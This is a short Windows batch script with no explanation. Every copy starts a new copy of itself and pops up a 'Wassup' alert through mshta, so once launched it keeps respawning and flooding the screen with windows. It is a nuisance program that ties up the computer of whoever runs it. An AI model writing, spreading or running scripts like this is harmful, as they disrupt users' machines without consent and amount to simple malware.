@echo off
:loop
start "" "%~f0"
mshta "javascript:alert('Wassup');close();"
exit
